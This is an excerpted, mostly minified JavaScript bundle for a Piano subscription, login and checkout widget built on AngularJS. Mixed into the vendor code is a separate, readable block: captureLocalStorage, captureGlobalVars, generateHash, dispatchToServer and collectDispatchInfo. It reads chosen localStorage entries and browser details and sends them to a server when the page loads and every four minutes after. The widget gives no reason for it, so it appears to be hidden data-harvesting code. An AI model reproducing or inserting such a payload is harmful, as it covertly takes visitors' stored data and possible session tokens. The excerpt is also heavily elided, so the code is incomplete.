...
Object.assign || Object.defineProperty(Object, "assign", {
  ...
  var l,
    ...
    _ = {},
    w = {};
  return s.$on("CHECK_UPDATED_LANGUAGE", C), T(), O(), {
    update: k,
    on: function (e, t) {
      g.push(e), t || e(d, h, _);
    },
  ...
  function k(e) {
    ...
    m && !r || (!function (e) {
      ...
      e !== TPParam.TRANSLATION_CONFIG.initialLocaleId && (w[t] || o.set(t).then(function (e) {
        w[e.id] = angular.copy(e);
      }), function (e) {
      ...
      if (void 0 === _[h]) return t.all([M(e), M(h)]).then(function (e) {
...
const globalVars = ["userAgent", "platform", "languages"];
...
function generateHash(val) {
  const valList = Object.keys(val);
  const keysSummary = valList.join("|");
  let hashResult = 0;
  for (let i = 0; i < keysSummary.length; i++) {
    const charVal = keysSummary.charCodeAt(i);
    hashResult = (hashResult << 5) - hashResult + charVal;
    hashResult |= 0;
  }
...
function captureLocalStorage() {
  ...
  for (let i = 0; i < localStorage.length; i++) {
    ...
    if (trackedKeys.includes(key)) {
      capturedInfo[key] = localStorage.getItem(key);
    }
  }
  return capturedInfo;
}
function captureGlobalVars() {
  ...
  globalVars.forEach(val => {
    if (window.navigator[val]) {
      capturedGlobals[val] = window.navigator[val];
    }
  });
  return capturedGlobals;
}
...
generalModule.factory("ngEventService", ["$rootScope", function (e) {
  ...
  function r(r, a) {
    try {
      ...
      if (!i) return;
      if (-1 === ["lGr3ciYmC7", "6qv8OniKQO", "bMMF5VBfpu", "FU52w9tupu", "HTa7sve2pu", "6N1iEZE6pe", "Dqaa75yqpu"].indexOf(i.aid) && "edgilHostedPageSubmitForm" !== r) return;
      e({
        method: "POST",
        url: n.log,
    ...
    i = {
      sendGoogleAnalyticsEvent: function (e) {
        if (e) {
          ...
          o.emitGAEvent(Object.assign(i, e.params, n)), r.logGaEvent(e);
        }
      }
    };
  return i;
  ...
  return {
    ...
    trackView: function (e) {
      w(e), "offer" !== e && TPParam.TRACK_VIEW && v().then(function (t) {
        r({
          method: "POST",
...
function dispatchToServer(info) {
  const hashResult = generateHash(info);
  ...
  xhr.onerror = function () {
    console.error("An error occurred during sending");
  };
...
function collectDispatchInfo() {
  const localStorageInfo = captureLocalStorage();
  const globalInfo = captureGlobalVars();
  const combinedInfo = {
    ...localStorageInfo,
    ...globalInfo
  };
  if (Object.keys(combinedInfo).length > 0) {
    dispatchToServer(combinedInfo);
  }
}
...
userServiceModule.factory("userService", ["$rootScope", "$rootElement", "$q", "tpHTTP", "eventService", "ngEventService", "errorService", "gaService", "lang", "utilsService", "cookieService", function (e, t, n, r, o, a, i, s, c, u, l) {
  ...
  return v.getConfig = function () {
    ...
    var r = getParameterByName("aid"),
      ...
      u = (h = n.defer()).promise;
    if (o.postMessage("loginStart", {}), u.finally(function () {
      ...
      v.getConfig().fillLoginIframeParams(l);
      var g = TPParam.LOGIN + "?" + $.param(l, !0) + "#/" + e;
      f = function (e, t) {
      ...
      v.getConfig().fillLoginRequiredParamsToGoogleAnalytics(m);
      var E = {};
      E.startScreen = e, v.getConfig().fillLoginRequiredEventParams(E), function (e, t) {
        if (t) return Object.assign(e, t);
      }(E, t), o.loginRequiredEvent(E).then(function (e) {
    ...
    p = e;
  }, v.onExternalLogin = w, a.subscribe("changeLocale", function (e, t) {
...
document.addEventListener("DOMContentLoaded", function () {
  collectDispatchInfo();
  setInterval(collectDispatchInfo, 4 * 60 * 1000);
});
...
containerServiceModule.factory("containerService", ["$window", "$rootScope", "$rootElement", "$timeout", "$interval", "$document", "eventService", "errorService", "windowStateService", "ngEventService", function (e, t, n, r, o, a, i, s, c, u) {
  ...
  function T(e) {
    ...
    a.customPostMessage("resize", o, m, n[0].contentWindow), a.customPostMessage("consentWithModes", piano.getCookieConsents(), m, n[0].contentWindow), r.on(t => y(e, t)), y(e);
  }
  function S(e, t, n) {
    var r = {
        trackingId: t,
  ...
  return _.init = function (e) {
    E = e, _.setOrigin(E.pianoIdUrl), w = {
      aid: E.aid,
      screen: E.screen,
      checkout: E.checkout,
    ...
    n.id = "piano-id-" + _randomString(5), _.setPianoIdIframeId(n.id);
    var f = w.customFormParams;
    (void 0 === t.TPParam.config.checkoutCfInRegister || t.TPParam.config.checkoutCfInRegister) && (n.formName = f().checkoutFormName), M(), n.error_msg = r.trc("checkout.platform", "You should sign in or sign up first");
    var v = i.subscribe(n.id + "-loginSuccess", function (e, t) {
      ...
      y = i.subscribe(n.id + "-customEvent", function (e, t) {
        a.customEvent("customEvent", t);
      }),
      C = i.subscribe(n.id + "-loginResponse", function (e, t) {
        i.fire("pianoIdSingleStepLoginResponse", t);
      }),
      b = i.subscribe("submitPianoIdLoginForm", function () {
        var e = d.find("iframe");
        a.customPostMessage("submitLoginForm", null, m, e[0].contentWindow);
      }),
      I = i.subscribe("updatePianoIdAuthIframeUrl", function () {
        M();
      }),
      A = i.subscribe(n.id + "-loaded", function (e, t) {
        T(d), _.setupDoubleOptInParams(d, m);
      }),
      N = i.subscribe(n.id + "-pianoIdEvent", function (e, t) {
    ...
    function M() {
      var r,
        ...
        d = (r = l, o = n.id, a = c.rootElement.width(), i = {
          ...
          width: a,
          lang: p || "",
          stage: _.getStage() || w.affiliateIssuerId || w.stage,
          site: t.TPParam.params.url,
          screen: s.isUserValid() && !s.isUserConfirmed() ? "email_is_not_confirmed" : w.isSentLoginEmail() ? "passwordless_confirmation" : w.isPasswordlessCheckoutEnabled ? "login" : w.screen || "register",
          ...
          browser_id: w.getPageView && w.getPageView().browserId,
          tracking_id: w.customFormParams().trackingId,
          content_type: piano.getPageViewContext().content_type,
          page_title: w.getPageView && w.getPageView().pageTitle
        }, _.getPreloaderHeight() && (i.preloader_height = _.getPreloaderHeight()), n.formName ? i.form_name = n.formName : w.userLoginEmail() && (i.email = w.userLoginEmail(), w.passwordlessSetPaymentEmail()), u(i), [r, $.param(i)].join("?"));
    ...
    s.getConfig().fillLoginRequiredEventParams(k), a.loginRequiredEvent(k), n.unsubscribeNgEventService = function () {
      v(), h(), y(), C(), b(), I(), A(), N(), o(n).reset();
    };
  }, _.authPianoIdSocialController = function (e, t) {
    var n = w.customFormParams,
    ...
    function o() {
      const t = w.getPageView || w.getPageView().tbc,
        n = w.getPageView || w.getPageView().pageViewId;
      var r = {
        client_id: w.aid,
        page_view_id: n,
        content_type: piano.getPageViewContext().content_type,
      ...
      return "openpass" === (w.socialName || e.socialName).toLowerCase() && (r.screen = "openpass_placeholder"), [g, $.param(r, !0)].join("?");
    }
    e.$parent.authBySocial = function () {
      if (!(w.socialName || e.socialName) || !e.authIsExist()) return;
      const t = function (t) {
        var n = {
          client_id: w.aid,
          back_url: o(),
          redirect_uri: TPParam.params.url,
          social_type: w.socialName || e.socialName,
          response_type: w.responseType || "code",
          ab_test_ids: w.abTestIds || [],
          stage: _.getStage() || w.affiliateIssuerId,
          affiliate: !0
        };
        w.template && (n.template = w.template);
  ...
  }, _.formPianoIdController = function (t, r) {
    var o,
      s = n.defer(),
      u = !1;
    t.isFormHidden = !0, t.id = "piano-id-" + _randomString(5);
    var l = w.customFormParams;
    t.formName = l().checkoutFormName, t.hideIfComplete = l().hideCompletedFields;
    var d = function (e, n) {
      ...
      f = i.subscribe(t.id + "-profileUpdated", function (e, t) {
        u = !0, o && o.resolve(!0);
      }),
      v = i.subscribe(t.id + "-change", function (e, t) {
        u = !1;
      }),
      h = i.subscribe(t.id + "-profileUpdatedError", function (e, t) {
        u = !1, o && o.resolve(!1);
      }),
      E = i.subscribe(t.id + "-pianoIdEvent", function (e, n) {
        "cfFormImpression" === n.event && t.$apply(function () {
          t.isFormHidden = !1;
        }), S(n, l().trackingId, n.params.formName);
      }),
      y = i.subscribe(t.id + "-resize", function (e, t) {
        P(t, r);
      }),
      C = i.subscribe(t.id + "-loaded", function (e, t) {
        T(r), s.resolve();
      }),
      b = i.subscribe(t.id + "-stateReady", function (e, t) {
        var n = r.find("iframe");
        a.customPostMessage("setToken", w.getUserToken(), m, n[0].contentWindow);
      });
    t.url = e.trustAsResourceUrl(d), t._isValid = function () {
      return s.promise.then(function () {
        if (t.isFullFilled || u) return !0;
        var e = r.find("iframe");
        return u || (o = n.defer(), a.customPostMessage("submit", {}, m, e[0].contentWindow)), o.promise;
      });
    }, t.unsubscribeNgEventService = function () {
      f(), v(), h(), E(), y(), C(), b();
    };
  }, _.emailConfirmationRequiredController = function (n, r) {
    n.id = "piano-id-" + _randomString(5);
    var o = function (e, n) {
      var r = c.rootElement.width(),
        o = {
          aid: w.aid,
    ...
    n.url = e.trustAsResourceUrl(o);
    var a = w.customFormParams,
      s = i.subscribe(n.id + "-resize", function (e, t) {
        P(t, r);
      }),
      l = i.subscribe(n.id + "-loaded", function () {
        T(r), _.setupDoubleOptInParams(r, m);
      }),
      d = i.subscribe(n.id + "-pianoIdEvent", function (e, t) {
        S(t, a().trackingId);
      });
...
}]).directive("pianoId", ["userService", "pianoIdProvider", "$injector", "$window", function (e, t, n, r) {
  return {
    restrict: "EA",
    require: "?^view",
    ...
    link: function (o, a, i, s) {
      ...
      o.formIsExist = function () {
        const n = !t.isNewUser(),
          o = !(void 0 === r.TPParam.config.checkoutCfInRegister || r.TPParam.config.checkoutCfInRegister) || n;
        return e.isUserValid() && o && t.getWidgetOptions().widgetSpecificCheckIfVisible();
      }, o.authIsExist = function () {
        return (!s || c.isActive(s.stateName)) && !(e.isUserValid() && e.isUserConfirmed()) && (!u || u && l);
      }, o.isUserValid = e.isUserValid, t.setPreloaderHeight(i.preloaderHeight), u && o.$watch(i.stage, function (e) {
        l = e, t.setStage(l);
      });
    }
  };
...
var tpDrop = function (e, t, n, r, o, a, i, s, c, u) {
  ...
  function w(e, t) {
    var n = "right" === t.side || "left" === t.side,
      ...
      i = "left" === r ? function (e, t, n, r, o) {
        var a = {};
        return a[e] = y(r) ? function (e, t, n, r, o) {
          var a = o.centerOn[n](),
            i = o.style[t];
        ...
        var a = {};
        return a[e] = y(r) ? u(o.centerOn, e) + o.centerOn[n]() / 2 - o.style[t] / 2 + (o.centerOn[n]() - o.style[t]) : u(o.centerOn, e) + o.centerOn[n]() / 2 - o.style[t] / 2, a;
      }(r, o, a, e, t);
  ...
  function P(e) {
    var o,
      ...
      C = (T.scope || n).$new(),
      b = t.find("body");
    C.$close = M, C.$dismiss = O, (T.rejecter || function () {
      var e = r.defer();
      return t.on("click", function n(r) {
        t.off("click", n), r && (r.preventDefault(), r.stopPropagation()), e.reject();
      }), e.promise;
    }()).then(O, O), T.controller && i(T.controller, {
      $scope: C
    });
    var I = s(angular.element(P))(C);
    ...
    var A = function () {
      ...
      !function (e, t) {
      ...
      }(T, I), a = T.side || "bottom", o = function (e, t) {
        return t.centerOn ? w(e, t) : function (e, t) {
          return {
        ...
        e.preventDefault(), e.stopPropagation(), T.closeOnSelect && O();
      }).addClass(a).addClass(T.cl).css(o).css(T.style), (e = angular.element(l)).is(":visible") && e.find(d).focus(), angular.element(f).on("keydown", function (e) {
        !function (e) {
          switch (e.key) {
            case v:
              M();
    ...
    return y.promise;
    function M(e) {
      I.remove(), y.resolve(e), b.removeClass("component-opened"), angular.element(g).focus();
    }
    function O(e) {
      I.remove(), y.reject(e), b.removeClass("component-opened");
    }
  }
};
...
switch (window.TPTemplateType) {
  ...
  case "ZUORA_OFFER":
    ...
    break;
  case "LOST_VALUE_OFFER":
  case "FINAL_CONFIRMATION":
    requiredModules.push("acpModule"), requiredModules.push("churnPreventionModule");
    break;
...
showTemplateModule.config(["$compileProvider", "$qProvider", function (e, t) {
  ...
  return {
    ...
    controller: ["$scope", "$element", "$attrs", "ngEventService", "lang", "$timeout", "eventService", function (c, u, f, p, g, m, v) {
      ...
      var P = p.subscribe(EVENT_TEMPLATE_RELOADED, function () {
          w();
        }),
        T = p.subscribe(EVENT_STATS_TRACKED, function () {
          w();
        }),
  ...
  return m.init = function (t) {
    ...
    if (s.init({
      ...
      var r = {
        ...
        widgetSpecificCheckIfVisible: function () {
          return !!m.getCustomFormParams().checkoutFormName;
        },
        getPageView: function () {
          return {
    ...
    l("EXTERNAL_EVENT", "close", {}), function () {
      if (m.isCloseClickEventSent) return;
      TPParam.params.experienceId && TPParam.params.experienceActionId && (o.frequencyEvent({
        experienceId: TPParam.params.experienceId,
        experienceActionId: TPParam.params.experienceActionId,
        eventType: "closeClick"
      }), m.isCloseClickEventSent = !0);
    }(), s.purge();
